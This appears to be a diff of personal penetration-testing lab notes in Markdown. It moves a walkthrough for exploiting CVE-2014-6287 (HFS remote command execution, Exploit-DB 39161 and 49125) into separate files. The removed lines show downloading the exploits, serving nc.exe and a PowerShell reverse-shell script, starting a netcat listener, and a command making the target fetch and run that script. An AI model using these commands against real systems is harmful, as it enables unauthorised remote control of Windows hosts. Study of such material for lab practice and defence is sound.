@@ -60,68 +60,10 @@ Additional Settings :
 export SHELL=bash; export TERM=xterm-256color; stty rows 60 columns 126
 ```
 
-## Exploit DB (Windows)
-### CVE : 2014-6287 ([39161](https://www.exploit-db.com/exploits/39161))
-You can execute arbitrary commands on the remote Windows host.
+## CVEs
+- CVE : 2014-6287 ([39161](cve-2014-6287-39161.md))
+- CVE : 2014-6287 ([49125](cve-2014-6287-49125.md))
 
-Download the python script to kali
-```
-wget https://www.exploit-db.com/raw/39161 -O /tmp/39161.py
-```
-
-Download netcat binary file.  
-39161.pyではあらかじめローカルIP、ポートを指定する必要あり。指定したアドレスから、netcatの実行可能ファイルをnc.exeという名前でダウンロードする仕様。そして、ダウンロードしたnc.exeを実行し、そのローカルIP、ポートにコネクトバックする（リバースシェル）
-```
-wget https://github.com/andrew-d/static-binaries/raw/master/binaries/windows/x86/ncat.exe -O ~/Downloads/steel/nc.exe
-```
-
-Start python web server in kali
-```
-cd ~/Downloads/steel/
-python3 -m http.server 80
-```
-
-Start netcat listener
-```
-rlwrap nc -lvnp ${lport}
-```
-
-The following command needs to be executed TWICE.
-Download nc.exe first, and connects back to the listner on Kali second time. 
-```
-python 39161.py $rhost [RPORT]
-```
-
-### CVE : 2014-6287 ([49125](https://www.exploit-db.com/exploits/49125))
-You can execute arbitrary commands on the remote Windows host.
-
-Download the python script to kali
-```
-wget https://www.exploit-db.com/raw/49125 -O /tmp/49125.py
-```
-
-Download the powershell script to kali.
-Local IP and port in the script needs to be changed.
-```
-wget https://gist.github.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1 -O ~/Downloads/steel/mini-reverse.ps1
-```
-
-Start python web server in kali
-```
-cd ~/Downloads/steel/
-python3 -m http.server 80
-```
-
-Start netcat listener
-```
-rlwrap nc -lvnp ${lport}
-```
-
-Execute the script. Execute the commands passed as the third argument.
-```
-cd /tmp
-python3 49125.py $rhost [RPORT] "C:\windows\SysNative\WindowsPowershell\v1.0\powershell.exe -c wget 'http://${lhost}/mini-reverse.ps1' -outfile 'C:\Users\Bill\Desktop\mini-reverse.ps1'; C:\Users\Bill\Desktop\mini-reverse.ps1" 
-```
 
 ## Reference
 
